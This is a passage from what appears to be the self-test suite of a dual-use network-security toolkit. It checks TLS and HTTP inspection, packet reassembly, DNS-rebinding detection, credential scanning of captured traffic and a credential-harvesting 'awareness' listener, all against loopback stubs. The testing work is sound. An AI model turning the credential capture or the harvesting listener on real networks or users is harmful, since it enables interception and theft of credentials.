            assert inspected["negotiated"]["cipher"], "cipher not reported"
            assert "rejected" in inspected["chain_verification"] or "failed" in inspected["chain_verification"], \
                "self-signed certificate was not reported as untrusted: %s" % inspected["chain_verification"]
            assert any(entry == "127.0.0.1" for entry in inspected["san"]), \
                "SAN entry missing: %s" % inspected["san"]
            assert inspected["der_decoded"] is True, "native DER decoder did not parse the certificate"
            assert inspected["public_key"].get("bits") == 2048, \
                "public key size not decoded: %s" % inspected["public_key"]
            assert inspected["signature_algorithm"], "signature algorithm not decoded"
            record("online: TLS certificate inspection", "pass",
                   "%s / %s-bit %s, %s day(s) left, untrusted chain reported, SAN + fingerprint verified"
                   % (inspected["negotiated"]["version"], inspected["negotiated"]["cipher_bits"],
                      inspected["negotiated"]["cipher"], inspected["days_remaining"]))
        except FileNotFoundError as exc:
            record("online: TLS certificate inspection", "skip",
                   "openssl binary unavailable at run time: %s" % exc)
        except (AssertionError, FrameworkError) as exc:
            record("online: TLS certificate inspection", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("online: TLS certificate inspection", "fail", "%s: %s" % (type(exc).__name__, exc))
        finally:
            stop_flag.set()
            if server_sock is not None:
                try:
                    server_sock.close()
                except OSError:
                    pass
    else:
        record("online: TLS certificate inspection", "skip",
               "openssl binary unavailable or --no-live-tests requested")

    # 40. online: HTTP response + security-header audit (stub with redirect chain)
    if include_live:
        stub_server = None
        try:
            def _http_responder(method: str, path: str, headers: Dict[str, Any], body: bytes):
                if path == "/start":
                    return (302, "text/plain", b"moved",
                            {"Location": "/portal", "Server": "prismstrike-stub/1.0"})
                page = (b"<html><head><title>PrismStrike Test Portal</title></head>"
                        b"<body>stub</body></html>")
                return (200, "text/html; charset=utf-8", page,
                        {"Server": "prismstrike-stub/1.0",
                         "Strict-Transport-Security": "max-age=31536000",
                         "X-Frame-Options": "DENY"})

            stub_server = LoopbackHTTPServer(_http_responder).start()
            audit = http_inspect("%s/start" % stub_server.url_base, timeout=6.0)
            assert audit["status"] == 200, "final status wrong: %s" % audit["status"]
            assert len(audit["redirects"]) == 2, "redirect chain not followed: %s" % audit["redirects"]
            assert audit["final_url"].endswith("/portal"), "final URL wrong: %s" % audit["final_url"]
            assert audit["title"] == "PrismStrike Test Portal", "title not extracted: %s" % audit["title"]
            assert audit["server"] == "prismstrike-stub/1.0", "server banner not captured"
            missing = audit["security_headers_missing"]
            assert len(missing) == len(SECURITY_HEADERS) - 2, \
                "hardening audit wrong: %d missing" % len(missing)
            assert "content-security-policy" in missing, "CSP should be reported missing"
            record("online: HTTP response inspection", "pass",
                   "302 -> 200 chain followed, title/banner parsed, %d missing hardening header(s) flagged"
                   % len(missing))
        except (AssertionError, FrameworkError) as exc:
            record("online: HTTP response inspection", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("online: HTTP response inspection", "fail", "%s: %s" % (type(exc).__name__, exc))
        finally:
            if stub_server is not None:
                stub_server.stop()
    else:
        record("online: HTTP response inspection", "skip", "--no-live-tests requested")

    # 41. online: alert relay delivery (detections streamed to a stub collector)
    if include_live:
        stub_server = None
        try:
            def _relay_responder(method: str, path: str, headers: Dict[str, Any], body: bytes):
                return 200, "application/json", b'{"accepted": true}'

            stub_server = LoopbackHTTPServer(_relay_responder).start()
            relay = AlertRelay(webhook_url=stub_server.url_base, token="relay-token")
            armed = arm_alerts(relay)
            try:
                probe = armed.test()
                assert probe["delivered"] is True, "relay probe failed: %s" % probe["detail"]
                assert alert_port_open("203.0.113.7", 8443, "https-alt") is True
                assert alert_credential("203.0.113.8", "ftp", "jdoe", "(secret withheld)") is True
                secret = "SuperSecret123"
                alert_credential("203.0.113.8", "ftp", "jdoe", "(secret withheld)")
                deadline = time.time() + 8.0
                while time.time() < deadline and len(stub_server.requests) < 4:
                    time.sleep(0.2)
                assert len(stub_server.requests) >= 4, \
                    "relay delivered %d of 4 events" % len(stub_server.requests)
                previews = " ".join(str(entry.get("body_preview", ""))
                                    for entry in stub_server.requests)
                assert '"kind": "test"' in previews or '"kind":"test"' in previews, "probe event missing"
                assert "port-open" in previews, "port-open detection missing"
                assert "credential-capture" in previews, "credential-capture detection missing"
                assert "203.0.113.7" in previews, "detection payload missing the target"
                assert secret not in previews, "a raw secret leaked into the relay stream"
                stats = armed.stats()
                assert stats["delivered"] >= 1 and stats["failed"] == 0, "relay statistics wrong: %s" % stats
                record("online: alert relay delivery", "pass",
                       "%d events delivered to a stub collector; detections carried no raw secrets"
                       % len(stub_server.requests))
            finally:
                disarm_alerts()
        except (AssertionError, FrameworkError) as exc:
            record("online: alert relay delivery", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("online: alert relay delivery", "fail", "%s: %s" % (type(exc).__name__, exc))
        finally:
            if stub_server is not None:
                stub_server.stop()
    else:
        record("online: alert relay delivery", "skip", "--no-live-tests requested")

    # 42. online: journal event sink (NDJSON mirror of the session ledger)
    if include_live:
        stub_server = None
        try:
            def _sink_responder(method: str, path: str, headers: Dict[str, Any], body: bytes):
                return 200, "application/json", b'{"accepted": true}'

            stub_server = LoopbackHTTPServer(_sink_responder).start()
            sink_relay = AlertRelay(webhook_url=stub_server.url_base, sink=True,
                                    poll_interval=0.4)
            armed = arm_alerts(sink_relay)
            try:
                before = len(stub_server.requests)
                LOGGER.event("probe", "sink mirror line one", data={"step": 1})
                LOGGER.event("probe", "sink mirror line two", data={"step": 2})
                armed.stop()               # no poll tick can intervene: the flush must ship
                deadline = time.time() + 6.0
                mirrored = 0
                while time.time() < deadline:
                    bodies = " ".join(str(entry.get("body_preview", ""))
                                      for entry in stub_server.requests)
                    mirrored = bodies.count('"kind": "journal"') + bodies.count('"kind":"journal"')
                    if mirrored >= 2:
                        break
                    time.sleep(0.2)
                assert mirrored >= 2, "journal mirror delivered %d line(s)" % mirrored
                assert "sink mirror line one" in bodies and "sink mirror line two" in bodies,                     "journal content missing from the mirror"
                assert "raw" not in bodies.lower().replace("raw secret", ""),                     "unexpected payload content in the mirror"
                record("online: journal event sink", "pass",
                       "session ledger mirrored as NDJSON by the final flush (%d request(s))"
                       % (len(stub_server.requests) - before))
            finally:
                disarm_alerts()
        except (AssertionError, FrameworkError) as exc:
            record("online: journal event sink", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("online: journal event sink", "fail", "%s: %s" % (type(exc).__name__, exc))
        finally:
            if stub_server is not None:
                stub_server.stop()
    else:
        record("online: journal event sink", "skip", "--no-live-tests requested")

    # 47. platform: hping reply horizon is bounded and counted
    try:
        replicator = HpingReplicator(target="127.0.0.1", protocol="icmp", count=1,
                                     display_live=False)
        assert replicator.replies_seen.maxlen == HPING_REPLY_HORIZON,             "reply horizon not bounded: %s" % replicator.replies_seen.maxlen
        assert replicator.replies_total == 0, "reply counter should start at zero"
        probe_seq = 4242
        with replicator._pending_lock:
            replicator._pending[probe_seq] = {"protocol": "icmp",
                                              "identifier": replicator._identifier,
                                              "sent_at": time.time() - 0.02}
        echo = IP(src="127.0.0.1", dst="127.0.0.1") / ICMP(type=0, id=replicator._identifier,
                                                            seq=probe_seq)
        record_obj = replicator._match_and_review(echo)
        assert record_obj is not None, "echo reply was not matched to its pending probe"
        assert record_obj["rtt_ms"] is not None, "RTT was not computed for the matched reply"
        assert probe_seq not in replicator._pending, "claimed probe was not removed"
        drain_seq = 4343
        with replicator._pending_lock:
            replicator._pending[drain_seq] = {"protocol": "icmp",
                                              "identifier": replicator._identifier,
                                              "sent_at": time.time() - 0.01}
        drained = IP(src="127.0.0.1", dst="127.0.0.1") / ICMP(type=0,
                                                               id=replicator._identifier,
                                                               seq=drain_seq)
        with replicator._queue_lock:
            replicator._queue.append(drained)
        drained_replies = replicator._drain_replies(flush=True)
        assert drained_replies == 1, "the capture drain did not match its queued reply"
        assert replicator.replies_total == 1,             "reply counter not incremented: %s" % replicator.replies_total
        for index in range(HPING_REPLY_HORIZON + 250):
            replicator.replies_seen.append({"sequence": index})
            replicator.replies_total += 1
        assert len(replicator.replies_seen) == HPING_REPLY_HORIZON,             "horizon did not cap the reply list: %d" % len(replicator.replies_seen)
        record("platform: hping reply horizon", "pass",
               "replies are matched in one lock transaction, capped at %d retained "
               "(total still counted)" % HPING_REPLY_HORIZON)
    except (AssertionError, FrameworkError) as exc:
        record("platform: hping reply horizon", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("platform: hping reply horizon", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 48. extension: TCP reassembly is correct across a 32-bit sequence wrap
    try:
        reassembler = StreamReassembler()
        first = IP(src="203.0.113.5", dst="203.0.113.9") / TCP(sport=61000, dport=80,
                                                               seq=0xFFFFFFE0, flags="PA")
        first = first / Raw(b"WRAP-TAIL")
        second = IP(src="203.0.113.5", dst="203.0.113.9") / TCP(sport=61000, dport=80,
                                                               seq=0x00000020, flags="A")
        second = second / Raw(b"POST-WRAP")
        reassembler.add(first)
        reassembler.add(second)
        streams = reassembler.extract(direction="client", mark_gaps=False)
        payload = b"".join(streams.values())
        assert payload == b"WRAP-TAILPOST-WRAP",             "wrapped segments were reordered: %r" % payload
        record("extension: TCP reassembly wrap", "pass",
               "segments straddling 0xFFFFFFFF were stitched in the correct order")
    except (AssertionError, FrameworkError) as exc:
        record("extension: TCP reassembly wrap", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("extension: TCP reassembly wrap", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 49. extension: HTTP security-header scoring (A-F)
    try:
        perfect = {"strict-transport-security": "max-age=63072000; includeSubDomains",
                   "content-security-policy": "default-src 'self'; script-src 'self'",
                   "x-frame-options": "DENY", "x-content-type-options": "nosniff",
                   "referrer-policy": "strict-origin-when-cross-origin",
                   "permissions-policy": "geolocation=()",
                   "cross-origin-opener-policy": "same-origin",
                   "cross-origin-embedder-policy": "require-corp"}
        best = security_header_score(perfect)
        assert best["grade"] == "A" and best["score"] == 100, "full header set: %s" % best
        worst = security_header_score({})
        assert worst["grade"] == "F" and worst["score"] == 0, "empty header set: %s" % worst
        unsafe = dict(perfect)
        unsafe["content-security-policy"] = "default-src 'self'; script-src 'unsafe-inline'"
        unsafe["strict-transport-security"] = "max-age=0"
        partial_score = security_header_score(unsafe)
        assert partial_score["score"] < best["score"], "weak values earned full credit"
        assert "content-security-policy" in partial_score["partial"],             "unsafe CSP was not flagged as partial: %s" % partial_score["partial"]
        assert [SECURITY_HEADER_WEIGHTS[name] for name in ("strict-transport-security",
                                                           "content-security-policy")] == [25, 25]
        record("extension: security-header scorer", "pass",
               "full set grades A/100, empty set F/0, weak values lose credit (%d partial)"
               % len(partial_score["partial"]))
    except (AssertionError, FrameworkError) as exc:
        record("extension: security-header scorer", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("extension: security-header scorer", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 50. extension: PMTU black-hole classification
    try:
        blackhole = classify_pmtu_probe("silent", "reply", 1472, 1472, "")
        assert blackhole["verdict"] == "blackhole", "silent DF drop misclassified: %s" % blackhole
        signalled = classify_pmtu_probe("unreachable", "reply", 1472, 1472,
                                        "ICMP type 3 code 4 (fragmentation needed)")
        assert signalled["verdict"] == "pmtud-signalled",             "ICMP feedback misclassified: %s" % signalled
        clear = classify_pmtu_probe("reply", "reply", 1200, 1200, "")
        assert clear["verdict"] == "cleartext", "healthy path misclassified: %s" % clear
        both_silent = classify_pmtu_probe("silent", "silent", 1472, 1472, "")
        assert both_silent["verdict"] == "blackhole",             "double silence misclassified: %s" % both_silent
        assert "black hole" in blackhole["detail"].lower(), "verdict detail lacks a diagnosis"
        record("extension: PMTU black-hole classifier", "pass",
               "silent DF drop -> blackhole, ICMP feedback -> pmtud-signalled, "
               "delivered pair -> cleartext")
    except (AssertionError, FrameworkError) as exc:
        record("extension: PMTU black-hole classifier", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("extension: PMTU black-hole classifier", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 51. extension: DNS rebinding classification
    try:
        rebind_series = [{"address": "93.184.216.34", "ttl": 30},
                         {"address": "93.184.216.34", "ttl": 30},
                         {"address": "127.0.0.1", "ttl": 5},
                         {"address": "10.0.0.5", "ttl": 5}]
        flagged = classify_rebinding(rebind_series)
        assert flagged["verdict"] == "rebinding-suspected",             "rebinding series missed: %s" % flagged
        assert flagged["spaces"].get("public") == 2 and flagged["spaces"].get("loopback") == 1,             "address spaces miscounted: %s" % flagged["spaces"]
        stable = classify_rebinding([{"address": "93.184.216.34", "ttl": 3600},
                                     {"address": "93.184.216.35", "ttl": 3600}])
        assert stable["verdict"] == "stable", "stable series flagged: %s" % stable
        long_ttl_flip = classify_rebinding([{"address": "93.184.216.34", "ttl": 3600},
                                            {"address": "172.16.5.5", "ttl": 3600}])
        assert long_ttl_flip["verdict"] == "space-flip",             "slow flip misclassified: %s" % long_ttl_flip
        local_only = classify_rebinding([{"address": "192.168.1.10", "ttl": 60}])
        assert local_only["verdict"] in ("insufficient-data", "local-only"),             "single local answer misclassified: %s" % local_only
        assert address_space("127.0.0.1") == "loopback" and address_space("8.8.8.8") == "public"
        record("extension: DNS rebinding classifier", "pass",
               "public->loopback flip under a 5s TTL flagged, long-TTL flip downgraded to "
               "space-flip, stable and local-only series cleared")
    except (AssertionError, FrameworkError) as exc:
        record("extension: DNS rebinding classifier", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("extension: DNS rebinding classifier", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 52. extension: subjectAltName decoding through nested wrappers
    try:
        host = b"prismstrike-a.test"
        inner = (bytes([0x82, len(host)]) + host
                 + bytes([0x87, 0x04, 0x7f, 0x00, 0x00, 0x01]))
        nested = bytes([0x30, len(inner)]) + inner
        wrapped = bytes([0x30, len(nested)]) + nested
        flattened = _der_parse_san(wrapped)
        assert flattened == ["prismstrike-a.test", "127.0.0.1"],             "nested SAN wrapper mis-parsed: %s" % flattened
        bare_payload = (bytes([0x82, len(host)]) + host
                        + bytes([0x87, 0x04, 0x7f, 0x00, 0x00, 0x01]))
        assert _der_parse_san(bare_payload) == ["prismstrike-a.test", "127.0.0.1"],             "content-only SAN payload mis-parsed: %s" % _der_parse_san(bare_payload)
        assert _der_parse_san(b"") == [], "empty SAN payload should yield no entries"
        record("extension: subjectAltName nesting", "pass",
               "names decoded through nested SEQUENCE wrappers and from a bare payload")
    except (AssertionError, FrameworkError) as exc:
        record("extension: subjectAltName nesting", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("extension: subjectAltName nesting", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 53. online: a truncated capture download is refused, not analysed
    if include_live:
        stub_server = None
        try:
            def _truncating_server(declared: int, delivered: int):
                listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                listener.bind(("127.0.0.1", 0))
                listener.listen(1)
                port = listener.getsockname()[1]

                def _serve():
                    try:
                        connection, _ = listener.accept()
                        with connection:
                            connection.recv(4096)
                            body = bytes([0xd4, 0xc3, 0xb2, 0xa1]) + b"P" * max(0, delivered - 4)
                            crlf = bytes([13, 10])
                            response_head = crlf.join([
                                b"HTTP/1.1 200 OK",
                                b"Content-Type: application/vnd.tcpdump.pcap",
                                b"Content-Length: %d" % declared]) + crlf + crlf
                            connection.sendall(response_head)
                            connection.sendall(body)
                    except OSError:
                        pass
                    finally:
                        try:
                            listener.close()
                        except OSError:
                            pass

                worker = threading.Thread(target=_serve, daemon=True)
                worker.start()
                return port, worker

            port, worker = _truncating_server(declared=8192, delivered=1024)
            before = set(os.listdir(LOGGER.artifact_dir))
            refusal = ""
            try:
                fetch_remote_capture("http://127.0.0.1:%d/truncated.pcap" % port,
                                     analyse=False, timeout=8.0)
            except FrameworkError as exc:
                refusal = str(exc)
            worker.join(timeout=3.0)
            assert "truncated" in refusal.lower(),                 "a truncated transfer was not refused: %r" % refusal
            leftover = set(os.listdir(LOGGER.artifact_dir)) - before
            assert not [name for name in leftover if "_fetch_" in name],                 "partial capture left on disk: %s" % sorted(leftover)
            record("online: truncated capture refused", "pass",
                   "8192 declared / 1024 delivered refused and the partial file removed")
        except (AssertionError, FrameworkError) as exc:
            record("online: truncated capture refused", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("online: truncated capture refused", "fail", "%s: %s" % (type(exc).__name__, exc))
        finally:
            if stub_server is not None:
                stub_server.stop()
    else:
        record("online: truncated capture refused", "skip", "--no-live-tests requested")

    # 54. extension: reassembly ordering across a mid-stream start and a 32-bit wrap
    try:
        timeline = StreamReassembler()

        def _push_segment(sequence_value: int, payload: bytes, sport: int = 51000) -> None:
            frame = (IP(src="198.51.100.7", dst="198.51.100.9")
                     / TCP(sport=sport, dport=80, seq=sequence_value, flags="PA") / Raw(payload))
            timeline.add(frame)

        _push_segment(0x40, b"MIDDLE")             # capture starts mid-stream
        _push_segment(0x30, b"HEAD-")              # a segment that predates the base
        _push_segment(0xFFFFFF80, b"WRAP!")        # and one across the 32-bit boundary
        stitched = b"".join(timeline.extract(direction="client", mark_gaps=False).values())
        assert stitched == b"WRAP!HEAD-MIDDLE", "timeline scrambled: %r" % stitched
        flow = next(iter(timeline.flows.values()))
        stored = sorted(flow["client"]["segments"].keys())
        assert stored and stored[0] == 0, "timeline origin is not zero: %s" % stored
        assert all(key >= 0 for key in stored), "a negative offset was stored: %s" % stored
        record("extension: reassembly timeline", "pass",
               "mid-stream start, pre-base segment and 0xFFFFFFFF wrap stitched as %r "
               "(no negative offsets stored)" % stitched)
    except (AssertionError, FrameworkError) as exc:
        record("extension: reassembly timeline", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("extension: reassembly timeline", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 55. extension: transient capture purge preserves the structured trail
    try:
        purge_dir = tempfile.mkdtemp(prefix="prismstrike-purge-")
        try:
            raw_captures = ["sess_online_capture_ab12.pcap", "sess_fetch_cd34.pcapng",
                            "sess_capture_ef56.pcap"]
            structured = ["sess_online_capture_ab12.json", "sess.summary.json",
                          "report.html", "notes.txt"]
            for name in raw_captures + structured:
                with open(os.path.join(purge_dir, name), "wb") as handle:
                    handle.write(b"X" * 64)
            before = sorted(os.listdir(purge_dir))
            preview = purge_transient_captures(dry_run=True, artifact_dir=purge_dir)
            assert preview["matched"] == 3, "dry run matched %s file(s)" % preview["matched"]
            assert sorted(os.listdir(purge_dir)) == before, "the dry run deleted something"
            live_run = purge_transient_captures(dry_run=False, artifact_dir=purge_dir)
            remaining = sorted(os.listdir(purge_dir))
            assert live_run["removed"] == 3, "purge removed %s file(s)" % live_run["removed"]
            assert remaining == sorted(structured), "structured trail damaged: %s" % remaining
            assert not live_run["failed"], "purge reported failures: %s" % live_run["failed"]
            record("extension: transient capture purge", "pass",
                   "dry run listed 3 raw captures untouched, live purge removed all 3 and "
                   "kept 4 structured ledgers")
        finally:
            shutil.rmtree(purge_dir, ignore_errors=True)
    except (AssertionError, FrameworkError) as exc:
        record("extension: transient capture purge", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("extension: transient capture purge", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 56. platform: pcap/pcapng ingest probe + a real PcapNG round trip
    try:
        ingest = pcap_ingest_capabilities()
        for required_key in ("scapy_pcap", "pcapng_reader", "pcapng_writer", "tcpdump",
                             "dumpcap", "libpcap", "warnings"):
            assert required_key in ingest, "capability key missing: %s" % required_key
        assert isinstance(ingest["warnings"], list), "warnings is not a list"
        doctor_rows = [entry["name"] for entry in DependencyDoctor.audit()]
        if not any("capture ingest" in name for name in doctor_rows):
            raise AssertionError("dependency doctor has no capture-ingest row: %s" % doctor_rows)
        pcapng_note = "reader=%s writer=%s warnings=%d" % (
            "yes" if ingest["pcapng_reader"] else "no",
            "yes" if ingest["pcapng_writer"] else "no", len(ingest["warnings"]))
        if ingest["pcapng_reader"] and ingest["pcapng_writer"]:
            capture_dir = os.path.join(LOGGER.artifact_dir, "pcapng_selftest")
            os.makedirs(capture_dir, exist_ok=True)
            pcapng_path = os.path.join(capture_dir, "ingest_probe.pcapng")
            from scapy.utils import PcapNgWriter
            probe_packets = [
                IP(src="203.0.113.40", dst="203.0.113.41") / UDP(sport=5555, dport=5556)
                / Raw(b"pcapng-probe-1"),
                IP(src="203.0.113.41", dst="203.0.113.40") / UDP(sport=5556, dport=5555)
                / Raw(b"pcapng-probe-2")]
            with PcapNgWriter(pcapng_path) as writer:
                for probe_packet in probe_packets:
                    writer.write(probe_packet)
            with open(pcapng_path, "rb") as probe_handle:
                magic = probe_handle.read(4)
            if magic != bytes([0x0A, 0x0D, 0x0D, 0x0A]):
                raise AssertionError("writer did not emit PcapNG framing: %r" % magic)
            analysis = analyse_pcap(pcapng_path, max_packets=50)
            if analysis["packets_in_file"] != 2:
                raise AssertionError("pcapng analysis read %s packet(s)"
                                     % analysis["packets_in_file"])
            if analysis["packets_analysed"] != 2:
                raise AssertionError("pcapng analysis processed %s packet(s)"
                                     % analysis["packets_analysed"])
            pcapng_note += ", 2-packet PcapNG analysed end to end"
        record("platform: pcap/pcapng ingest", "pass", pcapng_note)
    except (AssertionError, FrameworkError) as exc:
        record("platform: pcap/pcapng ingest", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("platform: pcap/pcapng ingest", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 57. extension: listener slow-client deadline (module 17 harvester)
    if include_live:
        harness_server = None
        try:
            harness_server, harness_captures = _build_awareness_server(
                "127.0.0.1", 0, "Deadline Probe", "username", "password", False, "",
                client_timeout=1.0, max_connections=4, connection_budget=3.0)
            threading.Thread(target=harness_server.serve_forever, daemon=True).start()
            harness_port = int(harness_server.server_address[1])
            idle = socket.create_connection(("127.0.0.1", harness_port), timeout=5.0)
            idle_started = time.time()
            idle.settimeout(6.0)
            try:
                closed_marker = idle.recv(64)
            except (socket.timeout, OSError):
                closed_marker = b"still-open"
            idle_elapsed = time.time() - idle_started
            try:
                idle.close()
            except OSError:
                pass
            if closed_marker != b"":
                raise AssertionError("the silent client was not disconnected: %r" % closed_marker)
            if idle_elapsed >= 5.0:
                raise AssertionError("the deadline took %.2fs to fire" % idle_elapsed)
            if int(harness_server.max_connections) != 4:
                raise AssertionError("connection cap not applied: %s"
                                     % harness_server.max_connections)
            # a slow-drip client satisfies every read deadline and must still be cut
            # off by the per-connection deadline
            drip = socket.create_connection(("127.0.0.1", harness_port), timeout=5.0)
            drip.settimeout(0.05)
            drip_started = time.time()
            drip_state = "still-open"
            while time.time() - drip_started < 8.0:
                try:
                    drip.sendall(b"G")
                except OSError:
                    drip_state = "closed"
                    break
                time.sleep(0.35)
                try:
                    if drip.recv(64) == b"":
                        drip_state = "closed"
                        break
                except socket.timeout:
                    continue
                except OSError:
                    drip_state = "closed"
                    break
            drip_elapsed = time.time() - drip_started
            try:
                drip.close()
            except OSError:
                pass
            if drip_state != "closed":
                raise AssertionError("the slow-drip client was never disconnected (%.2fs)"
                                     % drip_elapsed)
            if drip_elapsed >= 6.0:
                raise AssertionError("the connection deadline took %.2fs to fire" % drip_elapsed)
            live_client = socket.create_connection(("127.0.0.1", harness_port), timeout=5.0)
            live_client.settimeout(5.0)
            crlf = bytes([13, 10])
            live_client.sendall(b"GET / HTTP/1.0" + crlf + b"Host: localhost" + crlf + crlf)
            reply = b""
            while (crlf + crlf) not in reply and len(reply) < 8192:
                chunk = live_client.recv(4096)
                if not chunk:
                    break
                reply += chunk
            try:
                live_client.close()
            except OSError:
                pass
            if not reply.startswith(b"HTTP/1.1 200"):
                raise AssertionError("a normal request failed after the deadline was applied: %r"
                                     % reply[:60])
            record("extension: listener slow-client deadline", "pass",
                   "silent client dropped after %.2fs, slow-drip client cut at the %.0fs "
                   "deadline after %.2fs (cap 4 concurrent), normal request still served 200 OK"
                   % (idle_elapsed, harness_server.connection_budget, drip_elapsed))
        except (AssertionError, FrameworkError) as exc:
            record("extension: listener slow-client deadline", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("extension: listener slow-client deadline", "fail", "%s: %s"
                   % (type(exc).__name__, exc))
        finally:
            if harness_server is not None:
                try:
                    harness_server.shutdown()
                    harness_server.server_close()
                except OSError:
                    pass
    else:
        record("extension: listener slow-client deadline", "skip", "--no-live-tests requested")

    # 58. extension: TLS handshake descriptor reclamation
    try:
        rst_ready = threading.Event()
        rst_stop = threading.Event()
        rst_ports: List[int] = []

        def _rst_probe_server() -> None:
            probe_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                probe_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                probe_listener.bind(("127.0.0.1", 0))
                probe_listener.listen(16)
                rst_ports.append(int(probe_listener.getsockname()[1]))
                rst_ready.set()
                probe_listener.settimeout(0.25)
                while not rst_stop.is_set():
                    try:
                        probe_conn, _ = probe_listener.accept()
                    except (socket.timeout, OSError):
                        continue
                    try:
                        probe_conn.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                                              struct.pack("ii", 1, 0))
                        probe_conn.close()
                    except OSError:
                        pass
            finally:
                try:
                    probe_listener.close()
                except OSError:
                    pass

        threading.Thread(target=_rst_probe_server, daemon=True).start()
        rst_ready.wait(3.0)
        assert rst_ports, "the reset probe listener did not start"
        fd_root = "/proc/self/fd"
        fd_before = len(os.listdir(fd_root)) if os.path.isdir(fd_root) else -1
        probe_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        probe_context.check_hostname = False
        probe_context.verify_mode = ssl.CERT_NONE
        attempts = 40
        reclaimed = 0
        detached = 0
        completed = 0
        for _ in range(attempts):
            raw_sock = socket.create_connection(("127.0.0.1", rst_ports[0]), timeout=3.0)
            raw_fd = raw_sock.fileno()
            try:
                with probe_context.wrap_socket(raw_sock, server_hostname="probe.invalid"):
                    completed += 1
            except (ssl.SSLError, OSError):
                if raw_sock.fileno() < 0:
                    detached += 1
                try:
                    os.fstat(raw_fd)
                    descriptor_live = True
                except OSError:
                    descriptor_live = False
                if not descriptor_live and _reclaim_ownership(raw_sock) is False:
                    reclaimed += 1
        rst_stop.set()
        fd_after = len(os.listdir(fd_root)) if os.path.isdir(fd_root) else -1
        assert completed == 0, "%d reset handshakes unexpectedly completed" % completed
        assert reclaimed == attempts, ("%d/%d reset handshakes left a live descriptor or were "
                                       "double-closed" % (reclaimed, attempts))
        assert detached == attempts, ("%d/%d failures kept the raw socket attached"
                                      % (detached, attempts))
        if fd_before >= 0:
            # The per-attempt probe above is the leak proof; the table delta is the coarse
            # guard around it and tolerates descriptors opened by stub threads running
            # elsewhere in this process (log handles, other checks' listeners).
            assert fd_after - fd_before <= 2, ("the descriptor table grew by %d entries"
                                               % (fd_after - fd_before))
        spare = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        assert _reclaim_ownership(spare) is True, "a socket that is still owned was not reclaimed"
        assert _reclaim_ownership(spare) is False, "reclamation is not idempotent"
        assert _reclaim_ownership(None) is False, "a missing socket must be tolerated"
        record("extension: TLS handshake descriptor reclamation", "pass",
               "%d/%d reset handshakes left no live descriptor (descriptor table %d -> %d); the "
               "TLS layer owned and closed each one, and reclamation is idempotent"
               % (reclaimed, attempts, fd_before, fd_after))
    except (AssertionError, FrameworkError) as exc:
        record("extension: TLS handshake descriptor reclamation", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("extension: TLS handshake descriptor reclamation", "fail", "%s: %s"
               % (type(exc).__name__, exc))

    # 59. extension: HTTP basic-auth token decode
    try:
        decode_cases = [
            ("dXNlcjpwYXNz", "user:pass"),
            ("dXNlcjpwYXM=", "user:pas"),
            ("dXNlcjpwYQ==", "user:pa"),
            ("aGk", "hi"),
            ("aGk=", "hi"),
            ("aGk===", "hi"),
            ("YWJjZGU=", "abcde"),
            ("YWJjZGU", "abcde"),
            ("PDw_Pz8-", "<<???>"),
        ]
        for token, expected in decode_cases:
            decoded = _decode_basic_auth_token(token)
            assert decoded == expected, ("token %r decoded to %r, expected %r"
                                         % (token, decoded, expected))
        refused_cases = ["", " ", "A", "abcde", "!!!!", "dXNlcjpwYXNz!", None]
        for refused in refused_cases:
            outcome = _decode_basic_auth_token(refused)
            assert outcome is None, "token %r should have been refused, got %r" % (refused, outcome)
        probe = scan_for_credentials(b"Authorization: Basic dXNlcjpwYXNz", redact=True)
        basic = [entry for entry in probe if entry.get("kind") == "http basic auth"]
        assert basic, "the scanner did not report the basic-auth header"
        assert basic[0].get("decoded") == mask_secret("user:pass"),             "the finding did not carry the masked decoded pair"
        url_safe_probe = scan_for_credentials(b"Authorization: Basic PDw_Pz8-", redact=False)
        url_safe_basic = [entry for entry in url_safe_probe
                          if entry.get("kind") == "http basic auth"]
        if url_safe_basic:
            assert url_safe_basic[0].get("decoded") == "<<???>",                 "the URL-safe token decoded to %r" % url_safe_basic[0].get("decoded")
        record("extension: HTTP basic-auth decode", "pass",
               "%d token shapes decoded exactly, %d malformed shapes refused instead of guessed, "
               "URL-safe alphabet translated" % (len(decode_cases), len(refused_cases)))
    except (AssertionError, FrameworkError) as exc:
        record("extension: HTTP basic-auth decode", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("extension: HTTP basic-auth decode", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 60. extension: portable throughput counter backends
    try:
        netstat_fixture = chr(10).join([
            "Name  Mtu   Network       Address            Ipkts Ierrs     Ibytes    Opkts Oerrs     Obytes  Coll",
            "lo0   16384 <Link#1>                         12345     0    1234567    12345     0    1234567     0",
            "lo0   16384 127           localhost            12345     -    1234567    12345     -    1234567     0",
            "en0   1500  <Link#4>    a4:83:e7:11:22:33      900      0     400000      700     2     300000     0",
        ])
        parsed = _parse_netstat_output(netstat_fixture)
